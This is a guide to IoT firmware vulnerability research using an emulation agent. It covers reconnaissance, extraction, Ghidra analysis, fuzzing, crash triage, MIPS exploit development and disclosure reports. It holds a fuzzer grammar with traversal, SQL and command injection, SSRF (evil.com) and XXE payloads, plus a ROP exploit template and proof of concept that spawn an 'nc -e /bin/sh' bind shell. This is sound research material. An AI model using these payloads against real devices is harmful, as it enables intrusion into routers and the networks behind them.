# Vulnerability Research Workflow

> Complete methodology for firmware vulnerability research using the Emulation Agent.
>
> 使用模拟代理进行固件漏洞研究的完整方法论

---

## Table of Contents

1. [Overview](#overview)
2. [Phase 1: Target Selection and Reconnaissance](#phase-1-target-selection-and-reconnaissance)
3. [Phase 2: Extraction and Emulation](#phase-2-extraction-and-emulation)
4. [Phase 3: Vulnerability Discovery](#phase-3-vulnerability-discovery)
5. [Phase 4: Exploitation and Verification](#phase-4-exploitation-and-verification)
6. [Phase 5: Reporting](#phase-5-reporting)
7. [Case Studies](#case-studies)
8. [Integration with Claude Code Agents](#integration-with-claude-code-agents)

---

## Overview

This document describes a structured methodology for finding vulnerabilities in IoT/embedded device firmware using the Emulation Agent system. The methodology is designed to be:

- **Reproducible**: Every step is documented and repeatable
- **Automated where possible**: The Emulation Agent and vulnagent handle the mechanical work
- **Comprehensive**: Covers the full lifecycle from target selection to report writing
- **Practical**: Based on real-world IoT vulnerability research patterns

### Required Tools

| Tool | Purpose | Phase |
|------|---------|-------|
| binwalk | Firmware extraction | Phase 2 |
| Emulation Agent | Binary emulation | Phase 2-4 |
| QEMU | Architecture emulation | Phase 2-4 |
| Ghidra / IDA Pro | Static reverse engineering | Phase 3 |
| GDB-multiarch | Dynamic debugging | Phase 3-4 |
| Burp Suite / ZAP | Web application testing | Phase 3 |
| AFL++ / boofuzz | Fuzzing | Phase 3 |
| Wireshark / tcpdump | Network capture | Phase 3 |
| checksec / pwntools | Binary hardening analysis | Phase 3 |
| nmap | Network reconnaissance | Phase 1, 3 |

---

## Phase 1: Target Selection and Reconnaissance

### Goal

Identify firmware targets, gather information about the device, and map the attack surface before extraction.

### Step 1.1: Finding Firmware Images

**Vendor websites (preferred -- legitimate source):**
```bash
# Common vendor firmware portals
# D-Link: https://support.dlink.com
# TP-Link: https://www.tp-link.com/support/download/
# Netgear: https://www.netgear.com/support/download/
# Tenda: https://www.tendacn.com/en/download/
# Linksys: https://www.linksys.com/support/
# ASUS: https://www.asus.com/support/
# Ubiquiti: https://www.ui.com/download/
```

**FCC public filings:**
```bash
# Search FCC ID database
# Visit https://fccid.io and search by manufacturer
# Firmware images sometimes included in internal photos or test reports
# Look for "Internal Photos" exhibits
```

**Community firmware archives:**
- OpenWrt package repositories
- DD-WRT firmware database
- Firmware analysis research datasets (IoTSeeker, FirmXRay, etc.)

**Automated firmware collection:**
```bash
#!/bin/bash
# Simple firmware downloader for D-Link
# THIS IS AN EXAMPLE -- always comply with website terms of service

BASE_URL="https://support.dlink.com"
PRODUCTS=("DIR-882" "DIR-878" "DIR-867" "DIR-853")

for product in "${PRODUCTS[@]}"; do
    echo "Searching for $product..."
    # Use the vendor's download page
    # Rate-limit requests to be respectful
    sleep 2
done
```

### Step 1.2: Version Identification

Once you have a firmware image, identify its version:

```bash
# Extract version string from binary
strings firmware.bin | grep -iE 'version|firmware|build' | head -20

# Check binwalk for version info
binwalk firmware.bin | grep -i version

# After extraction, check common version files
find squashfs-root/ -name "*version*" -o -name "*VERSION*" -o -name "*release*"
cat squashfs-root/etc/os-release 2>/dev/null
cat squashfs-root/etc/product 2>/dev/null

# Extract build date
strings firmware.bin | grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}'
```

### Step 1.3: Attack Surface Mapping

**Identify key components:**

```bash
# List all binaries
find squashfs-root/ -type f -exec file {} \; | grep ELF | cut -d: -f1 > binaries.txt

# Categorize by function
echo "=== Network Services ==="
grep -E '(httpd|nginx|lighttpd|boa|goahead|uhttpd|telnetd|sshd|ftpd|snmpd|upnpd)' binaries.txt

echo "=== Management Interfaces ==="
grep -E '(cgi|api|xml|json|soap)' binaries.txt

echo "=== Protocol Handlers ==="
grep -E '(dns|dhcp|ppp|vpn|ipsec|l2tp|pptp)' binaries.txt

echo "=== Custom Daemons ==="
grep -vE '(busybox|ash|sh|ls|cat|mkdir|mount|ifconfig)' binaries.txt | grep -v '\.so$'

# Check open ports (from config files)
grep -rE 'port.*[0-9]+' squashfs-root/etc/ 2>/dev/null
grep -r 'listen' squashfs-root/etc/ 2>/dev/null

# Check for web services
find squashfs-root/ -type d -name "www" -o -name "web" -o -name "htdocs" -o -name "html"
```

**Attack surface checklist:**

| Surface | What to Look For | Tools |
|---------|-----------------|-------|
| Web interface | CGI scripts, ASP pages, PHP files, API endpoints | Burp Suite, directory brute-force |
| Network services | Telnet, SSH, FTP, SMB, SNMP, UPnP, mDNS | nmap, netcat |
| Management protocols | TR-069, CWMP, SNMP, proprietary config protocols | Wireshark, custom scripts |
| Hardware interfaces | UART, JTAG, SPI, I2C (from PCB analysis) | Logic analyzer, multimeter |
| Configuration files | Passwords, keys, certificates, debug flags | grep, strings |
| Update mechanism | Firmware update endpoints, signature checks | Reverse engineering, mitmproxy |
| Cloud APIs | Backend communication, MQTT, WebSocket | Wireshark, Burp Suite |
| Debug interfaces | Hidden admin pages, debug endpoints, backdoors | strings analysis, URL brute-force |

**Vulnerability classification by attack surface:**

```python
#!/usr/bin/env python3
"""Attack surface classifier for firmware binaries."""

import subprocess, re, json, os
from collections import defaultdict

def classify_binary(binary_path, strings_output):
    """Classify a binary by its likely attack surface."""

    categories = {
        "web_server": [r"httpd", r"goahead", r"nginx", r"apache", r"lighttpd", r"boa"],
        "cgi_handler": [r"cgi", r"\.asp", r"\.php", r"form.*handler"],
        "telnet_ssh": [r"telnetd", r"sshd", r"dropbear"],
        "upnp": [r"upnp", r"ssdp", r"soap"],
        "dns_dhcp": [r"dnsmasq", r"dhcpd", r"dhclient"],
        "ppp_vpn": [r"pppd", r"pptp", r"l2tp", r"openvpn", r"ipsec"],
        "config_manager": [r"nvram", r"uci", r"config", r"flash"],
        "update": [r"upgrade", r"update", r"firmware", r"download"],
        "cloud": [r"mqtt", r"cloud", r"aws", r"azure", r"iot.*hub"],
        "media": [r"dlna", r"upnp.*av", r"samba", r"smbd", r"ftpd"],
        "auth": [r"login", r"auth", r"pam", r"radius", r"tacacs"],
    }

    results = defaultdict(list)
    lower = strings_output.lower()

    for category, patterns in categories.items():
        for pattern in patterns:
            if re.search(pattern, lower):
                results[category].append(pattern)

    return dict(results)


def main():
    rootfs = "squashfs-root"
    binaries = subprocess.check_output(
        f"find {rootfs} -type f -executable", shell=True
    ).decode().splitlines()

    report = {}
    for binary in binaries:
        try:
            out = subprocess.check_output(
                ["strings", binary], timeout=10
            ).decode(errors="replace")
        except:
            continue

        classification = classify_binary(binary, out)
        if classification:
            report[os.path.basename(binary)] = classification

    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
```

### Step 1.4: CVE Research

Before diving deep, check what is already known:

```bash
# Search CVE database for the target
# Example: D-Link DIR-882
cve_search_term="D-Link DIR-882"
# Use: https://nvd.nist.gov/vuln/search
# Use: https://cve.mitre.org/cve/search_cve_list.html
# Use: https://www.cvedetails.com/

# Check exploit databases
# https://www.exploit-db.com/
# https://packetstormsecurity.com/

# Search GitHub for existing research
# https://github.com/search?q=D-Link+DIR-882+firmware
```

---

## Phase 2: Extraction and Emulation

### Goal

Extract the firmware, get key services running in QEMU, and document baseline behavior.

### Step 2.1: Firmware Extraction

```bash
# Primary extraction
binwalk -eM --directory=extracted firmware.bin

# If binwalk fails, try alternative tools
python3 -m firmware_mod_kit.extract firmware.bin extracted_manual/

# Check extraction results
find extracted/ -type d | head -20
find extracted/ -type f -exec file {} \; | grep ELF | wc -l
```

### Step 2.2: Upload and Detect Architecture

```bash
# Package rootfs
cd extracted/_firmware.bin.extracted/squashfs-root/
tar -czf /tmp/rootfs.tar.gz .

# Upload to Emulation Agent
ROOTFS_ID=$(curl -s -X POST http://your-vm-ip:9100/api/upload_rootfs \
  -F "file=@/tmp/rootfs.tar.gz" | jq -r '.rootfs_id')
echo "Rootfs ID: $ROOTFS_ID"

# Verify architecture
curl -s http://your-vm-ip:9100/api/health | jq '.'
```

### Step 2.3: Start Key Services

```bash
# Start services one at a time, documenting each

# 1. Configure NVRAM first (if needed)
curl -X POST http://your-vm-ip:9100/api/nvram_config \
  -H "Content-Type: application/json" \
  -d "{
    \"rootfs_id\": \"$ROOTFS_ID\",
    \"config\": {
      \"lan_ipaddr\": \"192.168.0.1\",
      \"http_port\": \"80\",
      \"product_name\": \"DIR-882\",
      \"firmware_version\": \"1.20\"
    }
  }"

# 2. Start httpd
HTTPD_ID=$(curl -s -X POST http://your-vm-ip:9100/api/start_service \
  -H "Content-Type: application/json" \
  -d "{
    \"rootfs_id\": \"$ROOTFS_ID\",
    \"binary_path\": \"/usr/sbin/httpd\",
    \"binary_name\": \"httpd\",
    \"args\": [],
    \"port\": 8880
  }" | jq -r '.service_id')
sleep 3

# 3. Try starting telnetd  
curl -X POST http://your-vm-ip:9100/api/start_service \
  -H "Content-Type: application/json" \
  -d "{
    \"rootfs_id\": \"$ROOTFS_ID\",
    \"binary_path\": \"/usr/sbin/telnetd\",
    \"binary_name\": \"telnetd\",
    \"args\": [\"-F\", \"-p\", \"2323\"],
    \"port\": 2323
  }"
sleep 2

# 4. Probe all started services
for port in 8880 2323; do
  echo "=== Probing port $port ==="
  curl -s -X POST http://your-vm-ip:9100/api/probe \
    -H "Content-Type: application/json" \
    -d "{\"host\": \"127.0.0.1\", \"port\": $port, \"protocol\": \"http\"}"
done
```

### Step 2.4: Baseline Behavior Documentation

```bash
#!/bin/bash
# Baseline documentation script
# Captures the normal behavior of the emulated service

SERVICE_PORT=8880
OUTPUT_DIR="baseline_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

# 1. HTTP response headers
echo "=== HTTP Headers ===" > "$OUTPUT_DIR/headers.txt"
curl -s -I "http://127.0.0.1:$SERVICE_PORT/" >> "$OUTPUT_DIR/headers.txt"

# 2. Main page content
echo "=== Main Page ===" > "$OUTPUT_DIR/index.html"
curl -s "http://127.0.0.1:$SERVICE_PORT/" >> "$OUTPUT_DIR/index.html"

# 3. Common endpoints
for path in / /login.html /login.asp /cgi-bin/ /admin/ /debug/ /goform/ /api/ /status /info; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$SERVICE_PORT$path")
  echo "$path -> $status" >> "$OUTPUT_DIR/endpoints.txt"
done

# 4. Directory discovery with common paths
for word in admin login config debug test backup system network wireless status \
            cgi-bin goform api webs setup wizard restore; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$SERVICE_PORT/$word")
  echo "/$word -> $status" >> "$OUTPUT_DIR/discovery.txt"
done

# 5. Save the full nmap scan (from the host, not via API)
nmap -sV -p $SERVICE_PORT 127.0.0.1 > "$OUTPUT_DIR/nmap.txt"

echo "Baseline captured in $OUTPUT_DIR"
```

---

## Phase 3: Vulnerability Discovery

### Goal

Find vulnerabilities through a combination of static analysis, dynamic analysis, and fuzzing.

### Step 3.1: Static Analysis

#### Binary Hardening Check

```bash
# Using checksec (or manual readelf)
curl -X POST http://your-vm-ip:9100/api/exec \
  -H "Content-Type: application/json" \
  -d "{
    \"rootfs_id\": \"$ROOTFS_ID\",
    \"command\": \"for f in /usr/sbin/* /bin/*; do echo \\\"=== \\$f ===\\\"; readelf -l \\$f 2>/dev/null | grep -E 'GNU_STACK|GNU_RELRO'; done\",
    \"timeout\": 30
  }"
```

**Hardening assessment checklist:**

| Protection | Check | Implication if Missing |
|-----------|-------|----------------------|
| NX (No-Execute) | `GNU_STACK` has `E` flag (not executable) | Stack/heap code execution possible |
| Stack Canary | Check for `__stack_chk_fail` references | Stack buffer overflow exploitation easier |
| PIE (Position Independent) | `ELF type: DYN` | Fixed addresses make ROP easier |
| RELRO (Full) | `GNU_RELRO` + `BIND_NOW` | GOT overwrite possible |
| FORTIFY_SOURCE | Check for `__memcpy_chk` | Direct calls to unsafe functions |

#### Ghidra/IDA Analysis Pattern Library

**Common vulnerability patterns to search for in Ghidra/IDA:**

**Pattern 1: Unsafe string copy to stack buffer**
```
Pattern: strcpy(local_buffer, user_input) where local_buffer is on the stack
Search: Xrefs to strcpy, strcat, sprintf where dst is a stack variable
Tools: Ghidra "Find references to" on strcpy/sprintf/strcat
```

**Pattern 2: Command injection via system()/popen()**
```
Pattern: system(sprintf(buffer, "cmd %s", user_input))
Search: Xrefs to system(), popen(), execve() with user-controlled format strings
Tools: Ghidra search for "system" string, trace parameters backward
```

**Pattern 3: Missing authentication checks**
```
Pattern: Handler function with no auth check before sensitive operation
Search: Compare functions that call auth_check() vs. those that bypass it
Tools: Ghidra function call graph for handler dispatch
```

**Pattern 4: Integer overflow leading to buffer overflow**
```
Pattern: malloc(user_controlled_size + constant) where user_controlled_size is near UINT_MAX
Search: malloc/alloca calls where size parameter comes from network input
Tools: Ghidra data flow trace on malloc size parameter
```

**Pattern 5: Format string vulnerability**
```
Pattern: printf(user_input) instead of printf("%s", user_input)
Search: printf/sprintf/snprintf where format string is not constant
Tools: Ghidra parameter analysis -- check if first arg to printf is variable
```

#### Ghidra Automation for Pattern Detection

```python
# Ghidra script: Find potentially vulnerable function calls
# Run in Ghidra Script Manager

from ghidra.program.model.symbol import RefType
from ghidra.program.model.listing import CodeUnit

DANGEROUS_FUNCTIONS = [
    "strcpy", "strcat", "sprintf", "gets", "scanf",
    "system", "popen", "execve", "memcpy", "read",
    "recv", "recvfrom"
]

def find_dangerous_calls():
    program = getCurrentProgram()
    listing = program.getListing()
    function_manager = program.getFunctionManager()

    results = []
    for func_name in DANGEROUS_FUNCTIONS:
        funcs = function_manager.getFunctions(func_name)
        # Also search external symbols
        sym_table = program.getSymbolTable()
        syms = sym_table.getSymbols(func_name)

        for sym in syms:
            refs = sym.getReferences(None)
            for ref in refs:
                if ref.getReferenceType().isCall():
                    addr = ref.getFromAddress()
                    results.append((func_name, addr))

    # Print results
    for func_name, addr in sorted(results, key=lambda x: str(x[1])):
        print("[{}] {} called at {}".format(
            "DANGER" if func_name in ["strcpy", "gets", "sprintf"] else "INFO",
            func_name, addr
        ))

find_dangerous_calls()
```

### Step 3.2: Dynamic Analysis

#### QEMU Strace Analysis

```bash
# Start service with strace
SERVICE_ID=$(curl -s -X POST http://your-vm-ip:9100/api/start_service \
  -H "Content-Type: application/json" \
  -d "{
    \"rootfs_id\": \"$ROOTFS_ID\",
    \"binary_path\": \"/usr/sbin/httpd\",
    \"binary_name\": \"httpd\",
    \"args\": [],
    \"port\": 8080,
    \"strace\": true
  }" | jq -r '.service_id')

# Send a test request
curl -s "http://127.0.0.1:8080/login.cgi?username=admin&password=test"

# Check strace output for dangerous syscalls
curl -s "http://your-vm-ip:9100/api/service/$SERVICE_ID" | jq -r '.stdout_tail' | \
  grep -E 'execve|system|open|read|write'
```

#### Network Capture

```bash
# On the host VM, capture traffic to/from the emulated service
sudo tcpdump -i lo -w capture.pcap port 8080 &
TCPDUMP_PID=$!

# Send requests
curl -s "http://127.0.0.1:8080/login.cgi?username=test&password=test" > /dev/null
curl -s -X POST "http://127.0.0.1:8080/goform/set" -d "param=value" > /dev/null

# Stop capture and analyze
sudo kill $TCPDUMP_PID
sleep 1
tcpdump -r capture.pcap -A | head -100
```

#### Memory Leak and Corruption Detection

```bash
# Use QEMU with AddressSanitizer (if supported)
# Start QEMU with ASAN-like detection
qemu-mipsel-static -L ./rootfs/abc123/ \
  -E ASAN_OPTIONS=detect_leaks=1:halt_on_error=1 \
  ./rootfs/abc123/usr/sbin/httpd

# Use valgrind on the QEMU process (not the emulated binary)
# This valgrinds QEMU itself, which is noisy but can find issues
# valgrind --tool=memcheck qemu-mipsel-static -L ... ./httpd
```

### Step 3.3: Fuzzing Strategy

#### Grammar-Based Fuzzing (HTTP)

For web interfaces, grammar-based fuzzing is more effective than random mutation:

```python
#!/usr/bin/env python3
"""Grammar-based HTTP fuzzer for IoT web interfaces."""

import requests
import itertools
import time

TARGET = "http://127.0.0.1:8080"

# Request grammar
HTTP_GRAMMAR = {
    "method": ["GET", "POST", "HEAD", "PUT", "DELETE"],
    "path": [
        "/", "/login.cgi", "/goform/set", "/cgi-bin/status",
        "/admin/config", "/api/v1/",
        "/../../../etc/passwd",
        "/" + "%2e%2e/" * 5 + "etc/shadow",
        "/" + "A" * 256,
        "/" + "\x00" + "admin",
        "/" + "{{7*7}}",  # SSTI test
        "/" + "../../../../proc/self/environ",
    ],
    "query_params": [
        "",
        "?id=1",
        "?id=1' OR '1'='1",  # SQL injection
        "?id=1; ls",          # Command injection
        "?file=../../etc/passwd",  # Path traversal
        "?url=http://evil.com",     # SSRF
        "?xml=<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",  # XXE
    ],
    "post_body": [
        "",
        "username=admin&password=admin",
        "data=" + "A" * 10000,  # Buffer overflow
        "<cmd>reboot</cmd>",     # XML injection
    ],
    "headers": [
        {},
        {"User-Agent": "Mozilla/5.0"},
        {"Content-Type": "application/xml"},
        {"X-Forwarded-For": "127.0.0.1\n\rX-Injected: true"},  # Header injection
    ]
}


def fuzz():
    """Generate and send fuzzed requests."""
    for method, path, query, body, headers in itertools.product(
        HTTP_GRAMMAR["method"],
        HTTP_GRAMMAR["path"],
        HTTP_GRAMMAR["query_params"],
        HTTP_GRAMMAR["post_body"],
        HTTP_GRAMMAR["headers"]
    ):
        url = f"{TARGET}{path}{query}"
        try:
            if method == "GET":
                r = requests.get(url, headers=headers, timeout=5)
            elif method == "POST":
                r = requests.post(url, data=body, headers=headers, timeout=5)
            else:
                r = requests.request(method, url, data=body, headers=headers, timeout=5)

            # Check for interesting responses
            if r.status_code == 500:
                print(f"[ERROR 500] {method} {url} body={body[:50]}")
            if "root:" in r.text or "admin:" in r.text:
                print(f"[SENSITIVE LEAK] {method} {url} -> Found sensitive data")
            if len(r.text) > 100000:
                print(f"[LARGE RESPONSE] {method} {url} -> {len(r.text)} bytes")
            if r.elapsed.total_seconds() > 10:
                print(f"[TIMEOUT] {method} {url} -> {r.elapsed.total_seconds()}s")

        except requests.exceptions.ConnectionError:
            print(f"[CRASH?] {method} {url} -> Connection refused. Service may have crashed.")
            time.sleep(2)  # Wait for service to restart
        except Exception as e:
            print(f"[ERROR] {method} {url} -> {e}")


if __name__ == "__main__":
    fuzz()
```

#### Mutation-Based Fuzzing (Binary Protocol)

For non-HTTP binary protocols:

```python
#!/usr/bin/env python3
"""Mutation-based protocol fuzzer."""

import socket
import struct
import random
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2323  # Telnet or other binary protocol

# Capture legitimate traffic first, then mutate

def mutate(data, intensity=1):
    """Apply mutations to binary data."""
    data = bytearray(data)
    for _ in range(intensity):
        mutation_type = random.choice(["flip", "insert", "delete", "overwrite", "arithmetic"])

        if mutation_type == "flip" and len(data) > 0:
            pos = random.randint(0, len(data) - 1)
            data[pos] ^= (1 << random.randint(0, 7))

        elif mutation_type == "insert":
            pos = random.randint(0, len(data))
            byte_val = random.randint(0, 255)
            data[pos:pos] = bytes([byte_val])

        elif mutation_type == "delete" and len(data) > 0:
            pos = random.randint(0, len(data) - 1)
            del data[pos]

        elif mutation_type == "overwrite" and len(data) > 0:
            pos = random.randint(0, len(data) - 1)
            data[pos] = random.randint(0, 255)

        elif mutation_type == "arithmetic" and len(data) >= 4:
            pos = random.randint(0, len(data) - 4)
            val = struct.unpack("<I", data[pos:pos+4])[0]
            val = val + random.randint(-65535, 65535)
            data[pos:pos+4] = struct.pack("<I", val & 0xFFFFFFFF)

    return bytes(data)


def fuzz_binary_protocol(seed_messages, iterations=100000):
    """Fuzz a binary protocol with seed messages."""
    crash_count = 0

    for i in range(iterations):
        # Select and mutate a seed
        seed = random.choice(seed_messages)
        mutated = mutate(seed, intensity=random.randint(1, 20))

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((TARGET_HOST, TARGET_PORT))
            sock.send(mutated)

            try:
                response = sock.recv(4096)
            except socket.timeout:
                response = b""

            sock.close()

            if i % 1000 == 0:
                print(f"Iteration {i}/{iterations}, crashes: {crash_count}")

        except ConnectionRefusedError:
            crash_count += 1
            print(f"[CRASH #{crash_count}] At iteration {i}")
            with open(f"crash_{crash_count:04d}.bin", "wb") as f:
                f.write(mutated)
            time.sleep(2)  # Wait for restart

        except Exception as e:
            print(f"[ERROR] Iteration {i}: {e}")


# Example seed messages for telnet-like protocol
SEEDS = [
    b"\xff\xfb\x01\xff\xfb\x03",  # Telnet WILL ECHO + WILL SUPPRESS GO AHEAD
    b"admin\r\n",
    b"password\r\n",
    b"\x00" * 256,
]
```

---

## Phase 4: Exploitation and Verification

### Goal

Triage crashes, develop exploits, and verify vulnerabilities.

### Step 4.1: Crash Triage

```bash
#!/bin/bash
# Crash triage script

CRASH_FILE="$1"
SERVICE_ID="$2"
ROOTFS_ID="$3"

echo "=== Crash Triage Report ==="
echo "Crash file: $CRASH_FILE"
echo "Service ID: $SERVICE_ID"
echo ""

# 1. Get crash context from agent
echo "=== Service Status at Crash ==="
curl -s "http://your-vm-ip:9100/api/service/$SERVICE_ID" | jq '.'

# 2. Analyze crash input
echo ""
echo "=== Crash Input Analysis ==="
xxd "$CRASH_FILE" | head -20
echo ""
echo "Input size: $(wc -c < "$CRASH_FILE") bytes"
echo "Entropy: $(ent "$CRASH_FILE" 2>/dev/null | grep Entropy)"

# 3. Reproduce crash
echo ""
echo "=== Reproducing Crash ==="
qemu-mipsel-static -L "./rootfs/$ROOTFS_ID/" \
    -strace \
    "./rootfs/$ROOTFS_ID/usr/sbin/httpd" &
QEMU_PID=$!
sleep 2

# Send crash input
cat "$CRASH_FILE" | nc -w 3 127.0.0.1 8080

# Wait for QEMU to respond
sleep 2
if kill -0 $QEMU_PID 2>/dev/null; then
    echo "QEMU still running"
    kill $QEMU_PID
else
    echo "QEMU crashed (reproducible)"
    wait $QEMU_PID
    echo "Exit code: $?"
fi
```

**Crash classification guide:**

| Crash Type | Signal/Exit | Exploitability | Priority |
|-----------|------------|----------------|----------|
| SIGSEGV (pc controlled) | SIGSEGV, pc=user_data | High | Critical |
| SIGSEGV (pc not controlled) | SIGSEGV, pc=libc_addr | Medium | High |
| SIGABRT (assertion) | SIGABRT | Low | Medium |
| SIGILL | SIGILL | Low | Low |
| Stack exhaustion | SIGSEGV in deep recursion | Low-Medium | Medium |
| Heap corruption | SIGSEGV in malloc/free | Medium | High |
| NULL pointer dereference | SIGSEGV, addr=0x0 | Low | Low |

### Step 4.2: Exploit Development in Emulated Environment

**Exploit development workflow:**

```bash
# 1. Start service with GDB stub
qemu-mipsel-static -g 1234 -L "./rootfs/$ROOTFS_ID/" \
    "./rootfs/$ROOTFS_ID/usr/sbin/httpd" &
QEMU_PID=$!

# 2. Connect GDB
gdb-multiarch -q \
    -ex "target remote localhost:1234" \
    -ex "set architecture mips" \
    "./rootfs/$ROOTFS_ID/usr/sbin/httpd"

# 3. In GDB, set breakpoints and analyze
(gdb) break *0x00401000                   # Break at function entry
(gdb) continue
# Send crash input via another terminal
(gdb) info registers                      # Check register state
(gdb) x/20x $sp                           # Examine stack
(gdb) info proc mappings                  # Check memory layout

# 4. Determine exploit strategy based on crash analysis
# - Stack overflow: ROP chain development
# - Heap overflow: House of Force / tcache poisoning
# - Format string: GOT overwrite
```

**MIPS ROP gadget search:**

```bash
#!/bin/bash
# Find ROP gadgets for MIPS exploitation

BINARY="./rootfs/$ROOTFS_ID/usr/sbin/httpd"
LIBC="./rootfs/$ROOTFS_ID/lib/libc.so.0"

# Install ROPgadget
pip install ROPgadget

# Find gadgets in both the binary and libc
echo "=== Binary Gadgets ==="
ROPgadget --binary "$BINARY" | grep -E "jr \$ra|jalr" | head -20

echo ""
echo "=== LIBC Gadgets ==="
ROPgadget --binary "$LIBC" | tee gadgets_libc.txt
# Key gadgets to find:
grep "system" gadgets_libc.txt
grep "move \$t9,\$" gadgets_libc.txt
grep "lw \$ra" gadgets_libc.txt
grep "addiu \$sp" gadgets_libc.txt

# Common MIPS exploitation primitives:
# 1. Set a0 = command string address, jump to system
# 2. Stack pivot (move sp to controlled buffer)
# 3. Return-to-sleep for ASLR bypass
```

**Exploit template (Python, for MIPS):**

```python
#!/usr/bin/env python3
"""MIPS exploit template for QEMU-emulated target."""

import struct
import socket

# Target info
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8080
BINARY_BASE = 0x00400000
LIBC_BASE = 0x77E00000  # Find via /proc/PID/maps

# Gadgets (example addresses -- replace with actual findings)
SYSTEM_ADDR    = LIBC_BASE + 0x0004C7E0  # system()
A0_GADGET      = LIBC_BASE + 0x00020E30  # lw $a0, 0x18($sp); jr $ra
RA_GADGET      = LIBC_BASE + 0x000148A0  # lw $ra, 0x1C($sp); addiu $sp, 0x20; jr $ra
SLEEP_GADGET   = LIBC_BASE + 0x0003B2C0  # sleep() -- for clean exit

# Buffer
PADDING        = b"A" * 260              # Offset to saved RA
CMD_STRING     = b"nc -lp 4444 -e /bin/sh\x00"  # Payload command


def build_rop_chain():
    """Build a MIPS ROP chain to call system(cmd)."""
    payload = PADDING

    # GADGET: lw $ra, 0x1C($sp); addiu $sp, 0x20; jr $ra
    payload += struct.pack("<I", RA_GADGET)
    payload += b"B" * 28                  # Padding to next sp
    # After addiu $sp, 0x20:
    # $sp+0x18 = cmd_addr, $sp+0x1C = system (next $ra)
    payload += b"C" * 24                  # Padding to $sp+0x18

    # Address of command string (place in BSS/buffer)
    cmd_addr = BINARY_BASE + 0x00180000   # Example BSS address
    payload += struct.pack("<I", cmd_addr)  # $sp+0x18 -> $a0
    payload += struct.pack("<I", SYSTEM_ADDR)  # $sp+0x1C -> $ra (jump to system)

    # Add the actual command string at a known address
    # In practice, you would put this in a controlled buffer

    return payload


def send_exploit():
    """Send the exploit to the target."""
    payload = build_rop_chain()
    print(f"Payload size: {len(payload)} bytes")
    print(f"Payload hex: {payload[:64].hex()}...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_HOST, TARGET_PORT))

        # Construct HTTP request with overflow in headers or body
        request = (
            b"POST /cgi-bin/vuln.cgi HTTP/1.0\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
            b"\r\n"
            + payload
        )
        sock.send(request)
        sock.close()
        print("Exploit sent")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    send_exploit()
```

### Step 4.3: Real Hardware Verification

**If possible, verify on real hardware:**

```bash
# 1. Obtain the physical device
# 2. Connect via UART/JTAG
# 3. Verify firmware version matches
# 4. Reproduce the vulnerability
# 5. Document differences between emulated and real device behavior

# Common differences to check:
# - Different ASLR behavior
# - Different library versions
# - Hardware-specific NVRAM values
# - Kernel module interactions
```

---

## Phase 5: Reporting

### Goal

Write a professional vulnerability report with accurate CWE mapping and CVSS scoring.

### Step 5.1: Vulnerability Report Template

```markdown
# Vulnerability Report: [TITLE]

## Summary
- **Vulnerability**: [Brief description]
- **CVE ID**: [CVE-YYYY-NNNNN or "Requested"]
- **CWE ID**: [CWE-XXX]
- **CVSS Score**: [X.X] ([Severity])
- **Affected Product**: [Vendor] [Product Model]
- **Firmware Version**: [Version]
- **Discovered By**: [Researcher Name]
- **Discovery Date**: [YYYY-MM-DD]
- **Disclosure Date**: [YYYY-MM-DD]

## Product Description
[Brief description of the affected product]
- Manufacturer: [Name]
- Product: [Model]
- Device Type: [Router/IP Camera/NAS/etc.]
- Architecture: [MIPS/ARM/x86]
- Operating System: [Linux kernel version if known]

## Vulnerability Description
[Detailed technical description of the vulnerability]
- Root cause
- Affected component
- Attack vector
- Prerequisites for exploitation
- Impact of successful exploitation

## Affected Code / Component
[Relevant code snippets or decompilation output]
```c
// Vulnerable function in httpd binary (address 0x00401230)
void handle_login(char *username, char *password) {
    char buffer[64];
    sprintf(buffer, "/usr/sbin/auth %s %s", username, password);  // COMMAND INJECTION
    system(buffer);
}
```

## Proof of Concept
[Step-by-step reproduction instructions]

1. Set up emulation environment:
   ```bash
   curl -X POST http://agent:9100/api/start_service ...
   ```

2. Send malicious request:
   ```bash
   curl "http://127.0.0.1:8080/login.cgi?username=admin;nc -lp 4444 -e /bin/sh"
   ```

3. Observe shell access:
   ```bash
   nc 127.0.0.1 4444
   # Connected to shell on emulated device
   ```

## Impact
[Description of the real-world impact]
- Attacker gains: [Remote code execution / Information disclosure / etc.]
- Affected users: [Number if known]
- Exploitation complexity: [Low/Medium/High]
- Privilege level obtained: [root/user]
- Persistence possible: [Yes/No]

## Affected Versions
- Version X.Y.Z and earlier
- Possibly other products using the same codebase

## Mitigation / Fix
[Recommended fix]
```c
// Fixed code:
void handle_login(char *username, char *password) {
    // Use execve() with argument array instead of system()
    char *args[] = {"/usr/sbin/auth", username, password, NULL};
    pid_t pid = fork();
    if (pid == 0) {
        execve(args[0], args, NULL);
        _exit(1);
    }
}
```

## Timeline
- YYYY-MM-DD: Vulnerability discovered
- YYYY-MM-DD: Vendor notified via [email/bug bounty platform]
- YYYY-MM-DD: Vendor acknowledged
- YYYY-MM-DD: Vendor released patch [version]
- YYYY-MM-DD: Public disclosure

## References
- [Link to vendor advisory]
- [Link to CVE entry]
- [Link to exploit PoC if published]
- [Link to research blog post]
```

### Step 5.2: CWE Mapping

Common CWE mappings for IoT firmware vulnerabilities:

| Vulnerability Type | CWE ID | Description |
|-------------------|--------|-------------|
| Buffer Overflow | CWE-120 | Classic buffer copy without size check |
| Stack Buffer Overflow | CWE-121 | Stack-based buffer overflow |
| Heap Buffer Overflow | CWE-122 | Heap-based buffer overflow |
| Command Injection | CWE-77 | Improper neutralization of special elements in commands |
| OS Command Injection | CWE-78 | OS command injection via shell metacharacters |
| SQL Injection | CWE-89 | SQL injection in CGI/backend scripts |
| Cross-Site Scripting | CWE-79 | XSS in web management interfaces |
| Path Traversal | CWE-22 | Directory traversal in file operations |
